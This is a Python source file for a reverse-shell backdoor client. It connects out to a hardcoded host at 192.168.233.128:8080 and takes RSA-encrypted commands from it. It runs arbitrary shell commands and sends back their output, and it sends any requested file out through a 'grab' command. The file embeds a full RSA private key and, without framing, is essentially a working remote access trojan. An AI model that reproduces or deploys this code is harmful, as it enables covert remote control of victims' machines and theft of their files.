import socket
import subprocess
import os
from Crypto.PublicKey import RSA

def encrypt(message):
    publickey = '''-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAt0CWD4aMiihm6a0C2nrG
F+/EPEzSkYwy5jk7jpSogsDIIcqo/CY38N6qcGNJVHgw01zyid9pVn7W1hS+N4Cs
3sIqYmDAI31ERf40KJEqBKm6rF0cpCGzmbAO2HBpP4E+H+DCzF+y4W0BOA2rQz39
+TWbMSzIl9a8tGaRabNniztaiLspczLaPB0b4EaW6dJ6n6sn9GtMAbdiK8lVt57D
BS0saFwUP6nClo3WqCTr9RWxyQWNHHMpJZnvwrw8N9nR4gc+FBRgCKyDOheoEXRv
l62RP+4ex9P+WVv5jbfPfjQLAnfaimcSjdkfZ4qitzmL+HUbCVTIYVGzl2UG2TER
zrOQ+tePjUWfKJWsPTwT52Q/CXsKOXvst51kIMKGol+zC8yAlIL2m0iGK61Ms/nW
APmApjtxxofimJ83BLDZwxJJ5R+jC8CA5upFu93P8uslrhpPZImnAToS/1Ho+gKw
lzBelcu0DB9TwRan/ZC3lau27OaMxqZc/PD460cTYopbYzXPvzUn6KFbA4r6xx5G
8LxbUeh5H/DOSXbpZvm+OgYFhau0H75FElEtjY3Skq0LT57q3TiknOJySAA8PnDY
fVsBg50WRL1QigwMXifV4jKnJ6zhWPldEchjPTvYcPhE8EHu3yvMBdZlU8YDbjek
8c+GEL2YT6Bwqg758qvuNZ8CAwEAAQ==
-----END PUBLIC KEY-----'''
    
    encryptor = RSA.importKey(publickey)
    encryptedData = encryptor.encrypt(message, 0)
    return encryptedData[0]



def decrypt(cipher):
    privatekey ='''-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----'''
    
    decryptor = RSA.importKey(privatekey)
    return decryptor.decrypt(cipher)

def transfer(s,path):
    
    if os.path.exists(str(path)):
        f = open(path, 'rb')
        packet = f.read(1024)
        while packet != '':
            s.send(packet)
            packet = f.read(1024)
        s.send('DONE')
        f.close()

    else:
        s.send('File not found')


def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.233.128',8080))

    while True:
        command = decrypt(s.recv(1024))

        if 'terminate' in command:
            s.close()
            break

        if 'grab' in command:
            #The command to transfer a file will be grab*filepath e.g. grab*C:\Users\mike\Desktop\photo.jpg
            grab, path = command.split('*')

            try:
                transfer(s, path)
            except Exception, e:
                s.send(str(e))
                pass
            
            

        else:
            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            result = CMD.stdout.read()
            if len(result) > 512:
                for i in range(0, len(result), 512):
                    chunk = result[0+i:512+i]
                    s.send(encrypt(chunk))
            else:
                s.send(encrypt(result))
            #s.send(encrypt(CMD.stderr.read()))

def main():
    connect()

if __name__ == '__main__':
    main()
            
